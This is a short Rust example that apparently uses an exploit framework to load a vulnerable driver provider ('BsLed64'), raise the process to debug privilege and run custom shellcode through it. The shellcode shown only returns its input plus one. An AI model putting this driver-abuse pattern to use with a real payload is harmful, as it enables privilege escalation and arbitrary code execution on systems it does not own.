use providers::bsled::BsLed64;
use vdem::{exploit::Exploit, shellcode::ShellCode, utils::promote_privilege_to_debug_level};

fn main() {
    promote_privilege_to_debug_level();

    let mut exploit = Exploit::instance().lock().unwrap();

    exploit.register_provider(Box::new(BsLed64::new()));

    exploit.select("BS_LED").unwrap();

    type FnMyFunction = unsafe extern "C" fn(value: i32) -> i32;

    let mut result: i32 = 0;

    exploit
        .build_shellcode::<FnMyFunction, _>(4096, |buffer| -> usize {
            // mov eax, ecx
            // inc eax
            // ret
            buffer[0..5].copy_from_slice(&[0x89u8, 0xC8, 0xFF, 0xC0, 0xC3]);
            0
        })
        .inspect(|shell_code| {
            result = unsafe { shell_code(1) };
        })
        .expect("Build shell code failed");

    println!("execute shell code succeed, result = {}", result);
}
